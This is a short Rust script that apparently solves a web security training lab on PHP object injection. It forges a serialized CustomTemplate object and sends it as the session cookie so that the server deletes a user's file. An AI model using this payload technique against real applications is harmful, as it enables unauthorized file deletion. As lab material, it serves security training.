/**********************************************************************
*
* Lab: Arbitrary object injection in PHP
*
* Hack Steps:
*      1. Encoding the serialized object after modifying
*      2. Fetching the home page with the modified object as session
*         to delete the morale.txt file
*
***********************************************************************/
use base64::{engine::general_purpose::STANDARD, Engine};
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0ab3006a045b34c080a36c6100e8000a.web-security-academy.net";

fn main() {
    print!("⦗1⦘ Encoding the serialized object after modifying.. ");
    flush_terminal();

    let serialized =
        r###"O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}"###;
    let serialized_encoded = STANDARD.encode(serialized);

    println!("{}", "OK".green());
    print!("⦗2⦘ Fetching the home page with the modified object as session to delete the morale.txt file.. ");
    flush_terminal();

    fetch_with_session("/", &serialized_encoded);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
